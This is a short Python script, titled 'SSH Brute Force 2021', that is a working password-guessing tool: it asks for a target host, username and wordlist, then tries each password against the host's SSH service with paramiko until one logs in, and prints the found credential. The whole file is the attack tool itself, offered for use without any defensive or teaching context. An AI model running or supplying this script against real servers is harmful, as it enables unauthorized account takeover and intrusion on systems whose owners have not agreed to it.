#SSH Brute Force 2021

# --- Libraries ---
import paramiko, sys, os, socket, termcolor

#ssh connection
def sshConnect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        #Port 22 is regular port for SSH
        ssh.connect(host, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code=1
    except socket.error as e:
        code=2

    ssh.close()
    return code


#User input
host = input("[+] Target address: ")
username = input("[+] SSH username: ")
inputFile = input("[+] Password file: ")
print("\n")

#is passwords file correct?
if os.path.exists(inputFile) == False:
    print("[!!] File/path does not exist.")
    sys.exit(1)

#Open file, comparison of passwords with SSH Client
with open(inputFile, "r") as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = sshConnect(password)
            if response == 0:
                print("\n")
                print("[!!] Found Password: " + str(termcolor.colored((password), 'green')) + " for account: " + str(termcolor.colored((username), 'green')))
                #return validPassword
                break
            elif response == 1:
                print(termcolor.colored(("Incorrect Password: "), 'red') + str(password))
            elif response == 2:
                print(termcolor.colored(("Socket error. Can not connect"), 'red'))
                sys.exit(1)
        except Exception as e:
            print(e)
            pass

#"Do you want to connect using found password?"
#def autoConnect(username, validPassword):
#   sshConnect(username,validPassword)